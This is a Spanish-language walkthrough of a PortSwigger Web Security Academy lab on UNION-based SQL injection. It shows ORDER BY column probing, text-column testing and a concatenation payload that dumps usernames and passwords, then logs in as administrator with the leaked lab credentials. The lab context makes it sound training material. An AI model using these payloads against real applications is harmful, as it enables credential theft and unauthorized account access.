# Write-up - PortSwigger SQLi Lab 5

Voy a hacer un laboratorio de Port Swigger. El lab 5 de SQLi (En esta url: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

## Descripción: Tradúcela al Español:

Lab: SQL injection UNION attack, retrieving multiple values in a single column.

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación por lo que puedes usar un ataque UNION para recuperar datos de otras tablas.

La base de datos contiene una tabla llamada users con columnas username y password.

Para resolver el laboratorio, realiza un ataque SQL injection UNION que recupere todos los usernames y passwords y usa esa información para loguearte como administrator.

---

Le damos a abrir lab y nos abre una página con la url:
https://0a6700dc03dc3880818efca2005b00a5.web-security-academy.net/

La página web tiene el aspecto de la imagen 1.

![Imagen 1](imagenes/imagen1.png)

Referencia imagen 1: Vista inicial de la aplicación.

---

Una vez dentro abrimos burpsuitepro y activamos FoxyProxy para capturar las requests.

Nos vamos a:
https://0a6700dc03dc3880818efca2005b00a5.web-security-academy.net/filter?category=Tech+gifts

Y enviamos la request a Repeater.

---

Repetimos el proceso:

' ORDER BY 1--
HTTP/2 200 OK

' ORDER BY 2--
HTTP/2 200 OK

' ORDER BY 3--
HTTP/2 500 Internal Server Error

Tenemos 2 columnas.

---

Probamos columnas que aceptan texto:

' UNION SELECT 'a',NULL--
HTTP/2 500

' UNION SELECT NULL,'a'--
HTTP/2 200

Solo una columna acepta texto.

---

Intento fallido:

' UNION SELECT username,password FROM users--
HTTP/2 500

---

Solución: concatenación

'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
HTTP/2 200

Resultado mostrado en imagen 2:

![Imagen 2](imagenes/imagen2.png)

Referencia imagen 2: usernames y passwords concatenados.

carlos~ryt485u7f54nyat7srna
wiener~m9m65kd27qbqt3gdmvpz
administrator~4qeqv833wzlpngct1izj

---

Login:

Usamos administrator / 4qeqv833wzlpngct1izj (imagen 3)

![Imagen 3](imagenes/imagen3.png)

Referencia imagen 3: login con credenciales.

---

Resultado final:

Lab resuelto (imagen 4)

![Imagen 4](imagenes/imagen4.png)

Referencia imagen 4: panel administrador.

